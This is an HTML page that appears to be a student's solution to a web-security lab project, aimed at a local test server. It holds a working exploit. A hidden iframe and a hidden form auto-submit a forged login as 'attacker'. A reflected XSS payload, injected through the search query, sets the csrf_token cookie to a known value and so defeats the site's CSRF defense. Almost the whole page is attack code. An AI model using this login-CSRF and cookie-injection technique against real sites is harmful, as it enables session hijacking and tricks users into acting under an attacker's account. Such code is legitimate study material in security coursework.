<!DOCTYPE html>

<html>
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
	<head>
		<iframe id = "frame" name="csrf1_frame" style="visibility:hidden;">
		</iframe>	
		
		<form id="csrf1_attack" target="csrf1_frame" style="visibility:hidden;"
			action="http://localhost:34443/project3/login?csrfdefense=1&xssdefense=0" 
			method="post" class="form-inline">
			<input type="hidden" id = "username" name="username" value="attacker">
			<input type="hidden" id = "userpass" name="password" value="123456">
			<input type="hidden" id = "token" name = "csrf_token" value="abcdefghijklmnopabcdefghijklmnop">
			<input type="submit" value="Login">

		</form>

	<script>

			var target = "http://localhost:34443/project3/";
			var url = target + "./search?csrfdefense=1&xssdefense=0&q=";
			url = url + encodeURIComponent("<script" + "> window.onload = function() { " +
			"document.cookie=\"csrf_token=abcdefghijklmnopabcdefghijklmnop\";} </" + "script>");

			var request = new XMLHttpRequest();
			request.onreadystatechange = function() {
				if (request.readyState == 4 && request.status == 200) {
					callback(request.responseText);
				}
			}

			request.open("GET", url, true);
			request.send(null);
			
			alert(url);
			alert(document.cookie);
			//document.getElementById("frame").src = url;

			//alert(document.getElementById("frame").src);
			//alert("here");
//			$("csrf1_attack").submit();
			document.getElementById("csrf1_attack").submit();
	</script>

	</head>
</html>
